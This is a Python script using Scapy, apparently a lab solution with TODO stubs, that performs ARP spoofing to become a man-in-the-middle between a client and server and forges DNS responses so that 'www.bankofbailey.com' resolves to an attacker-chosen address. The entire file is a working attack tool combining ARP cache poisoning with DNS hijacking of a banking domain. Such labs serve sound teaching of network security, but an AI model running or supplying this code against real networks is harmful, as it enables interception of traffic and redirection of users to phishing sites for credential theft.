# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=1, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    arpReq = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=IP)
    resp = srp(arpReq)
    print(f'# MAC for {IP}: {resp[0][0][1].hwsrc}')
    return resp[0][0][1].hwsrc

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    spoofReq = ARP(op=2 , pdst=dst_ip, psrc=src_ip, hwdst=dst_mac, hwsrc=src_mac)
    send(spoofReq)

# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    restoreReq = ARP(op=2, pdst=dstIP, psrc=srcIP, hwdst=dstMAC, hwsrc=srcMAC)
    send(restoreReq)

routingMap = {}

def handlePacket(pkt):
    global clientIP, serverIP, attackerMAC
    # Forward packet to indended host
    shouldHandle = pkt[Ether].dst == attackerMAC
    ip_src = pkt[IP].src
    ip_dst = pkt[IP].dst
    pkt[Ether].src = attackerMAC
    pkt[Ether].dst = routingMap[ip_dst]
    # print(f" Modified packet MAC : {pkt[Ether].dst}")
    # Check if DNS packet
    if shouldHandle:
        if pkt.haslayer(DNS):
            dns = pkt.getlayer(DNS)
            if dns.qr == 1:
                if dns.an is not None and dns.an.rrname == b'www.bankofbailey.com.':
                    # Change response address
                    pkt[DNS].an.rdata = "10.4.63.200"
                    del pkt[IP].len
                    del pkt[IP].chksum
                    del pkt[UDP].len
                    del pkt[UDP].chksum
                    pkt = pkt.__class__(bytes(pkt))
        sendp(pkt)


# TODO: handle intercepted packets
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
    routingMap[clientIP] = clientMAC
    routingMap[serverIP] = serverMAC
    sniff(prn=handlePacket, filter=f"udp port 53 and ip host {clientIP}")


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
